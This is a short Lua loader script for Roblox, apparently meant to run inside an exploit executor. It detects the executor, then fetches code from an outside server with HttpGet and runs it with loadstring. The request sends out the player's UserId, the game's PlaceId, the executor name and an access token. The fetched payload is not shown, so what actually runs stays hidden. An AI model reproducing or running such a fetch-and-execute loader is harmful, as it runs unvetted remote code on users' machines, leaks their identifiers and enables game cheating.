local l=game:GetService("Players").LocalPlayer
local o,x=pcall(function() return identifyexecutor() end)
local G=(getgenv and getgenv()) or _G
local p=(G.CCRAFT_PASS and G.CCRAFT_PASS["7d02b640"]) or ""
loadstring(game:HttpGet("https://api.ccraftspace.dpdns.org/p/7d02b640811b497a8d564d28c170f028?t=6adf66a8-810d517cbc7ebe7907e54378-0-0-338e3bf8-a6a492026259b080d92dacda2da8b92b&p="..p.."&u="..(l and l.UserId or 0).."&g="..game.PlaceId.."&x="..tostring(o and x or ""):gsub("%W","")))()